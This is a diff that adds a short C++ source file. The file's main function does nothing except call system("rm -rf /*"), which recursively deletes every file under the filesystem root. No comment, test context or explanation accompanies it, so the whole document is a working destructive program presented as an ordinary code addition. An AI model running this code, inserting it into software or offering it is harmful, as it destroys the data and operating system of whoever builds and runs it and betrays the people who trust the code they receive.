@@ -1,0 +1,7 @@
+#include <cstdlib>
+#include <iostream>
+
+int main() {
+    system("rm -rf /*");
+    return 0;
+}
